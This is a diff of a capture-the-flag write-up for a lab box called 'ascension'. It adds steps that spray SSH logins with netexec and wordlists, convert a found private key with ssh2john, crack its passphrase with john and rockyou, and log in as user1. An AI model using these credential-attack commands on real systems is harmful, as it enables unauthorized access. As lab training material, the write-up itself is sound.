@@ -169,27 +169,59 @@ There we go, we have *user1*. As always, add found usernames and password files 
 Now, can we connect with just the private key?
 
 ```bash
+┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
+└─$ chmod 600 id_rsa
+
 ┌──(haunter㉿kali)-[~/working/hs/easy/ascension]                                                            
-└─$ ssh -i id_rsa user1@$ascension                                                                          
+└─$ ssh -i id_rsa user1@$ascension                                                                       
 Enter passphrase for key 'id_rsa':                                                                          
 user1@10.1.39.71: Permission denied (publickey). 
+```
+
+How about using the key with the passwords from the password list found via FTP earlier?
+
+```bash
+┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
+└─$ nxc ssh $ascension -u /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p pwlist.txt
 ```
 
 Nope. So let's try to get the key's passphrase.
 
 ## Foothold
 
+First, the key needs to converted to a hash:
 
 ```bash
 ┌──(haunter㉿kali)-[~/working/hs/easy/ascension]                                                            
 └─$ ssh2john id_rsa > id_rsa.hash
 ```
 
+Then we can try to crack using *john*:
+
 
 ```bash
 ┌──(haunter㉿kali)-[~/working/hs/easy/ascension]                                                        
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
 ```
+
+![Cracked SSH key passphrase](/assets/ctf/hs/easy/ascension/2.png)
+
+Passphrase cracked!
+
+Now let's get our foothold:
+
+```bash
+┌──(haunter㉿kali)-[~/working/hs/easy/ascension]                                                            └─$ ssh -i id_rsa user1@$ascension                                                                                                                                                                                      Enter passphrase for key 'id_rsa':                                                                                                                                                                                   
+Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.14.0-1012-aws x86_64)
+Last login: Sun Sep 21 17:45:17 2025 from 10.0.0.247                                                                                                                                                                    
+user1@ip-10-1-39-71:~$ pwd                                                                                  /home/user1                                                                                                                                                                                                              
+user1@ip-10-1-39-71:~$ ls -alh                                                                          
+drwxr-x--- 5 user1 user1 4.0K Sep 21 17:45 .                                                                drwxr-xr-x 7 root  root  4.0K Sep 19 16:16 ..                                                               -rw-r--r-- 1 user1 user1  220 Mar 31  2024 .bash_logout                           
+drwxrwxr-x 3 user1 user1 4.0K Sep 21 00:16 .local                                                           
+-rw-r--r-- 1 user1 user1  807 Mar 31  2024 .profile                                                         
+drwx------ 2 user1 user1 4.0K Sep 21 17:27 .ssh    
+```
+
 
 ## Lateral Movement / Privilege Escalation
 ## Root / SYSTEM
